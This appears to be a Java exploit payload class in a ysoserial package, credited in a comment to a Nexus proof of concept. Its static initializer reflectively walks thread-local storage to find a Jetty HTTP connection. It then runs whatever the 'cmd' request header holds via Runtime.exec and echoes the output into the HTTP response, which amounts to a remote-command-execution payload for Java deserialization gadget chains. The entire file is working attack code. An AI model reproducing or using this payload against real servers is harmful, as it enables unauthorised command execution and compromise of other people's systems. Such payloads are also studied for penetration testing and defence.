package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

// https://github.com/shadowsock5/Poc/blob/master/Nexus/Echo_WebContext.java

public class MyClassLoader8 extends AbstractTranslet {
    static {
        try{

            /* Thread.currentThread().threadLocals */
            //获取当前线程对象
            Thread thread = Thread.currentThread();
            //获取Thread中的threadLocals对象
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            //ThreadLocalMap是ThreadLocal中的一个内部类，并且访问权限是default
            // 这里获取的是ThreadLocal.ThreadLocalMap
            Object threadLocalMap = threadLocals.get(thread);

            /* ThreadLocal.ThreadLocalMap */
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            //获取ThreadLocalMap中的Entry对象
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);

            //TODO
//            ThreadLocal.ThreadLocalMap.Entry[] objects = (ThreadLocal.ThreadLocalMap.Entry[]) tableField.get(threadLocalMap);
            Object[] objects = (Object[]) tableField.get(threadLocalMap);

            /* ThreadLocal.ThreadLocalMap.Entry */
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            //获取ThreadLocalMap中的Entry中的value字段
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            for (Object obj: objects) {
                if(obj!=null){
                    // org.eclipse.jetty.server.HttpConnection
                    Object httpConnection = entryValueField.get(obj);
                    if(httpConnection.getClass().getName().endsWith("HttpConnection")){
                        // org.eclipse.jetty.server.HttpChannelOverHttp
                        Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);

                        // org.eclipse.jetty.server.Request
                        Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
                        String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"cmd"});

                        // org.eclipse.jetty.server.Response
                        Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);

                        // 控制HTTP响应的Writer
                        PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);

                        // 构造命令执行的输入输出环境
                        StringBuilder stringBuilder = new StringBuilder();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));
                        String line;
                        while((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line).append("\n");
                        }
                        String res = stringBuilder.toString();

                        writer.write(res);
                        writer.close();
                    }
                }
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

